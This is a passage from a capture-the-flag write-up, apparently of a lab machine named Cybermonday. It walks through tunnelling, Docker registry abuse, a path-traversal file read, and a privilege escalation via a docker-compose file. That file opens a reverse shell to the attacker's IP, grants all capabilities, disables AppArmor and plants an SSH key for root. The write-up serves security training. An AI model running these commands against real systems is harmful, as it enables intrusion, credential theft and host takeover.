ssh-rsa <TRUNCATED> john@cybermonday
```
{% endcode %}

I couldn't read the user flag, but at least I got `john` as the user. There was also mention of the MySQL database, along with the username and password being `root:root`. I port forwarded this to my machine using `chisel`:

{% code overflow="wrap" %}
```bash
# on attacker
./chisel server -p 4444 --reverse

# on machine
./chisel client 10.10.14.32:4444 R:3306:db:3306 (DB_HOST = db from .env)
```
{% endcode %}

```
$ mysql -h 127.0.0.1 -u root -p     
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 39
Server version: 8.0.33 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

There were some databases present:

```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cybermonday        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webhooks_api       |
+--------------------+
```

Within `webhooks_api`, we can see the different webhooks I created:

```
MySQL [webhooks_api]> select * from webhooks;
+----+--------------------------------------+-------+-------------------+---------------+
| id | uuid                                 | name  | description       | action        |
+----+--------------------------------------+-------+-------------------+---------------+
|  1 | fda96d32-e8c8-4301-8fb3-c821a316cf77 | tests | webhook for tests | createLogFile |
|  2 | e2ee722a-3a0c-49b6-be2c-a3a78463ce24 | test  | test              | sendRequest   |
+----+--------------------------------------+-------+-------------------+---------------+
```

Not much here though.

### Docker Registry --> Source Code --> LFI

There are likely more hosts present on the 172.18.0.0/24 subnet, which is the subnet the Docker container is on (read `/etc/hosts` file). To enumerate this, we can change our `chisel` command to use the SOCKS proxy instead of just port forwarding 1 port:

```
./chisel server -p 5555 --reverse
./chisel client 10.10.14.32:5555 R:socks
```

Afterwards, I downloaded and ran the `nmap` binary on the webhook Docker:

```
www-data@070370e2cdc4:/tmp$ ./nmap_binary -sn 172.18.0.0/24 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-08-24 15:36 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.0061s latency).
Nmap scan report for cybermonday_redis_1.cybermonday_default (172.18.0.2)
Host is up (0.0048s latency).
Nmap scan report for cybermonday_api_1.cybermonday_default (172.18.0.3)
Host is up (0.0028s latency).
Nmap scan report for cybermonday_nginx_1.cybermonday_default (172.18.0.4)
Host is up (0.0023s latency).
Nmap scan report for 070370e2cdc4 (172.18.0.5)
Host is up (0.0020s latency).
Nmap scan report for cybermonday_registry_1.cybermonday_default (172.18.0.6)
Host is up (0.0019s latency).
Nmap scan report for cybermonday_db_1.cybermonday_default (172.18.0.7)
Host is up (0.0011s latency).
Nmap done: 256 IP addresses (7 hosts up) scanned in 16.63 seconds
```

There's a `registry` one, which is a hint towards enumerating a Docker registry instance:

```
$ proxychains -q curl 172.18.0.6:5000/v2/_catalog
{"repositories":["cybermonday_api"]}
```

We can change the `chisel` port forwarding commands to port foward `172.18.0.6:5000` and then use `docker pull` to download the image:

```
$ sudo docker pull 127.0.0.1:5000/cybermonday_api                
Using default tag: latest
latest: Pulling from cybermonday_api
5b5fe70539cd: Pull complete 
affe9439d2a2: Pull complete 
1684de57270e: Pull complete 
dc968f4da64f: Pull complete 
57fbc4474c06: Pull complete 
9f5fbfd5edfc: Pull complete 
5c3b6a1cbf54: Pull complete 
4756652e14e0: Pull complete 
57cdb531a15a: Pull complete 
1696d1b2f2c3: Pull complete 
ca62759c06e1: Pull complete 
ced3ae14b696: Pull complete 
beefd953abbc: Pull complete 
Digest: sha256:72cf91d5233fc1bedc60ce510cd8166ce0b17bd1e9870bbc266bf31aca92ee5d
Status: Downloaded newer image for 127.0.0.1:5000/cybermonday_api:latest
127.0.0.1:5000/cybermonday_api:latest
```

Afterwards, we can run the image:

```
$ sudo docker run -it 127.0.0.1:5000/cybermonday_api bash
root@a47a599326a1:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

Within this image, we can see some new files:

```
root@a47a599326a1:/var/www/html# ls -la
total 64
drwxrwxrwt 1 www-data www-data  4096 Jul  3 05:00 .
drwxr-xr-x 1 root     root      4096 Jun 14 04:37 ..
-rw-r--r-- 1 www-data www-data    10 May 29 01:46 .dockerignore
drwxr-xr-x 1 www-data www-data  4096 May 28 17:36 app
-rw-r--r-- 1 www-data www-data    56 May  8 16:25 bootstrap.php
-rw-r--r-- 1 www-data www-data   328 May 28 23:20 composer.json
-rw-r--r-- 1 www-data www-data 21602 May 28 23:20 composer.lock
-rw-r--r-- 1 www-data www-data   153 Jun 30 15:26 config.php
drwxr-xr-x 1 www-data www-data  4096 May 28 23:51 keys
drwxr-xr-x 1 www-data www-data  4096 May 29 02:03 public
drwxr-xr-x 1 www-data www-data  4096 May 28 23:20 vendor
```

Within the `LogsController.php` file, we find an indication of an API being used, as well as an LFI:

```php
root@a47a599326a1:/var/www/html/app/controllers# cat LogsController.php 
<?php

namespace app\controllers;
use app\helpers\Api;
use app\models\Webhook;

class LogsController extends Api
{
    public function index($request)
    {
        $this->apiKeyAuth();

        $webhook = new Webhook;
        $webhook_find = $webhook->find("uuid", $request->uuid);

        if(!$webhook_find)
        {
            return $this->response(["status" => "error", "message" => "Webhook not found"], 404);
        }

        if($webhook_find->action != "createLogFile")
        {
            return $this->response(["status" => "error", "message" => "This webhook was not created to manage logs"], 400);
        }

        $actions = ["list", "read"];

        if(!isset($this->data->action) || empty($this->data->action))
        {
            return $this->response(["status" => "error", "message" => "\"action\" not defined"], 400);
        }

        if($this->data->action == "read")
        {
            if(!isset($this->data->log_name) || empty($this->data->log_name))
            {
                return $this->response(["status" => "error", "message" => "\"log_name\" not defined"], 400);
            }
        }

        if(!in_array($this->data->action, $actions))
        {
            return $this->response(["status" => "error", "message" => "invalid action"], 400);
        }

        $logPath = "/logs/{$webhook_find->name}/";

        switch($this->data->action)
        {
            case "list":
                $logs = scandir($logPath);
                array_splice($logs, 0, 1); array_splice($logs, 0, 1);

                return $this->response(["status" => "success", "message" => $logs]);
            
            case "read":
                $logName = $this->data->log_name;

                if(preg_match("/\.\.\//", $logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logName = str_replace(' ', '', $logName);

                if(stripos($logName, "log") === false)
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                if(!file_exists($logPath.$logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logContent = file_get_contents($logPath.$logName);
                


                return $this->response(["status" => "success", "message" => $logContent]);
        }
    }
}
```

It appears that we can read files on the machine. Based on the imported modules for this file, we can find this API key within `app/helpers/Api.php`:

```php
root@a47a599326a1:/var/www/html/app/helpers# cat Api.php 
<?php

namespace app\helpers;
use app\helpers\Request;

abstract class Api
{
<TRUNCATED>
        $this->api_key = "22892e36-1770-11ee-be56-0242ac120002";

        if(!isset($_SERVER["HTTP_X_API_KEY"]) || empty($_SERVER["HTTP_X_API_KEY"]) || $_SERVER["HTTP_X_API_KEY"] != $this->api_key)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }
<TRUNCATED>
}
```

We just need to specify a HTTP header `X-Api-Key`. Using this, we can try to exploit LFI next. Within the `LogsController.php` code, there's this interesting part:

```php
$logPath = "/logs/{$webhook_find->name}/";
```

The `name` of the webhook seems to directly taken and used as the `$logPath` variable. We cannot use `../../../../` as the name using the web API. However, we do have access to the MySQL database.&#x20;

Login to the MySQL database and insert this entry:

```sql
use webhooks_api;
INSERT into webhooks VALUES (4,'02984d13-3974-4a9f-b31b-aa6a9557cb80','../../../../../../','desc','createLogFile');

MySQL [webhooks_api]> select * from webhooks;
+----+--------------------------------------+--------------------+-------------------+---------------+
| id | uuid                                 | name               | description       | action        |
+----+--------------------------------------+--------------------+-------------------+---------------+
|  1 | fda96d32-e8c8-4301-8fb3-c821a316cf77 | tests              | webhook for tests | createLogFile |
|  2 | e2ee722a-3a0c-49b6-be2c-a3a78463ce24 | test               | test              | sendRequest   |
|  3 | 7de92b9b-e356-4b69-a6ba-8da32d218b3c | lfi                | test              | createLogFile |
|  4 | 02984d13-3974-4a9f-b31b-aa6a9557cb81 | lfi1               | test              | createLogFile |
|  5 | 02984d13-3974-4a9f-b31b-aa6a9557cb80 | ../../../../../../ | desc              | createLogFile |
+----+--------------------------------------+--------------------+-------------------+---------------+
```

Now, we just need to bypass the string checks within the code using this:

```json
{"action":"read","log_name":"logs/. ./etc/passwd"}
```

<figure><img src="../../.gitbook/assets/image (4206).png" alt=""><figcaption></figcaption></figure>

LFI works! We don't have many files to read, so I started by reading the files within `/proc` to find stuff. Within the `/proc/self/environ` file, we can find a new password:

<figure><img src="../../.gitbook/assets/image (4207).png" alt=""><figcaption></figcaption></figure>

With this password, we can finally `ssh` in as the user and read the user flag:

<figure><img src="../../.gitbook/assets/image (4210).png" alt=""><figcaption></figcaption></figure>

## Privilege Esclation 2

### Sudo Privileges --> Docker-Compose YML File

`john` has can run `sudo` for one command:

```
john@cybermonday:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on localhost:
    (root) /opt/secure_compose.py *.ym
```

Here's the script:

```python
#!/usr/bin/python3
import sys, yaml, os, random, string, shutil, subprocess, signal

def get_user():
    return os.environ.get("SUDO_USER")

def is_path_inside_whitelist(path):
    whitelist = [f"/home/{get_user()}", "/mnt"]

    for allowed_path in whitelist:
        if os.path.abspath(path).startswith(os.path.abspath(allowed_path)):
            return True
    return False

def check_whitelist(volumes):
    for volume in volumes:
        parts = volume.split(":")
        if len(parts) == 3 and not is_path_inside_whitelist(parts[0]):
            return False
    return True

def check_read_only(volumes):
    for volume in volumes:
        if not volume.endswith(":ro"):
            return False
    return True

def check_no_symlinks(volumes):
    for volume in volumes:
        parts = volume.split(":")
        path = parts[0]
        if os.path.islink(path):
            return False
    return True

def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True

def main(filename):

    if not os.path.exists(filename):
        print(f"File not found")
        return False

    with open(filename, "r") as file:
        try:
            data = yaml.safe_load(file)
        except yaml.YAMLError as e:
            print(f"Error: {e}")
            return False

        if "services" not in data:
            print("Invalid docker-compose.yml")
            return False

        services = data["services"]

        if not check_no_privileged(services):
            print("Privileged mode is not allowed.")
            return False

        for service, config in services.items():
            if "volumes" in config:
                volumes = config["volumes"]
                if not check_whitelist(volumes) or not check_read_only(volumes):
                    print(f"Service '{service}' is malicious.")
                    return False
                if not check_no_symlinks(volumes):
                    print(f"Service '{service}' contains a symbolic link in the volume, which is not allowed.")
                    return False
    return True

def create_random_temp_dir():
    letters_digits = string.ascii_letters + string.digits
    random_str = ''.join(random.choice(letters_digits) for i in range(6))
    temp_dir = f"/tmp/tmp-{random_str}"
    return temp_dir

def copy_docker_compose_to_temp_dir(filename, temp_dir):
    os.makedirs(temp_dir, exist_ok=True)
    shutil.copy(filename, os.path.join(temp_dir, "docker-compose.yml"))

def cleanup(temp_dir):
    subprocess.run(["/usr/bin/docker-compose", "down", "--volumes"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    shutil.rmtree(temp_dir)

def signal_handler(sig, frame):
    print("\nSIGINT received. Cleaning up...")
    cleanup(temp_dir)
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Use: {sys.argv[0]} <docker-compose.yml>")
        sys.exit(1)

    filename = sys.argv[1]
    if main(filename):
        temp_dir = create_random_temp_dir()
        copy_docker_compose_to_temp_dir(filename, temp_dir)
        os.chdir(temp_dir)
        
        signal.signal(signal.SIGINT, signal_handler)

        print("Starting services...")
        result = subprocess.run(["/usr/bin/docker-compose", "up", "--build"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Finishing services")

        cleanup(temp_dir)
```

Essentially, this runs `docker-compose` as `root` using any YML file we create to spin up a Docker container based on an image we specify. There's also a lot of checks on the parameters we can and cannot specify.&#x20;

Based on the script, we have to set the following:

* Version set to 3
* No symlinks can be used
* No privileges can be set via `config`
* Read only permissions

I referred to the documentation for Docker Compose file version 3 to create the YML file with all capabilities:

{% embed url="https://docs.docker.com/compose/compose-file/compose-file-v3/" %}

```yaml
version: '3'

services:
  api:
    image: cybermonday_api # existing image on the box
    command: bash -c "bash -i >/dev/tcp/10.10.14.32/4444 0>&1 2<&1"
    cap_add:
      - ALL # set up docker escape to mount back onto main host machine
    devices:
      - /dev/sda1:/dev/sda1
```

Using the above file would give us a reverse shell in the Docker container we create:

<figure><img src="../../.gitbook/assets/image (4209).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can `mount` back onto the main machine since we have all capabilities. However, this does not work for some reason:

```
root@40792ce8edd1:/mnt# mount /dev/sda1 /mnt/ 
mount: /mnt: cannot mount /dev/sda1 read-only.
       dmesg(1) may have more information after failed mount system call.
```

As it turns out, AppArmor may be running on the thing preventing us from reading it:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-docker-bypass1" %}

We have to specify the `security_opt` parameter within our YML file:

```
version: '3'

services:
  api:
    image: cybermonday_api
    command: bash -c "bash -i >/dev/tcp/10.10.14.32/4444 0>&1 2<&1"
    cap_add:
      - ALL
    devices:
      - /dev/sda1:/dev/sda1
    security_opt:
      - "apparmor=unconfined"
```

We can then `mount` properly:

```
root@5f985fe0caa5:/var/www/html# mount /dev/sda1 /mnt/
root@5f985fe0caa5:/var/www/html# cd /mnt
root@5f985fe0caa5:/mnt# ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
```

Using this, we can write our public key to the `root` user's `.ssh` file:

```bash
cd /mnt/root
mkdir .ssh
echo 'KEY' >> .ssh/authorized_keys
chmod 700 .ssh/authorized_keys
chmod 600 .ssh
```

We can then `ssh` in as `root`:

<figure><img src="../../.gitbook/assets/image (4211).png" alt=""><figcaption></figcaption></figure>

Rooted!
